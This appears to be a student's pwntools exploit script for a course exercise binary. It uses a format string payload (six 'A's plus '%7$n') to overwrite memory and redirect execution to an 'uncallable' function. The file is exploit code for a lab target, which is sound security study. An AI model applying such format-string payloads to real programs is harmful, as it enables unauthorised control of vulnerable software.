#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = '/home/student/handout/exercise5/exercise5b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

'''
Issue:
- execute uncallable() using format string vulnerability

Ideas:
- Format string vulnerability => I can write values to a specific memory location to influence program's control flow
- Found that if I use the '%n' format specifier I can write the number of characters entered to the xth (in this case 7th) address (selected location) 

Workflow:
- Insights from Ghidra: buffer size 6
	- Fill buffer with 6 'A's --> format string '%7$n' => write to the 7th address on the stack (gdb analyses stack layout)
'''

# From Ghidra: buffer of 6
BUFFER_SIZE = 6

r = start()
r.recvline()

payload = b'A'*BUFFER_SIZE + b'%7$n'

r.sendline(payload)
print(r.recvall())
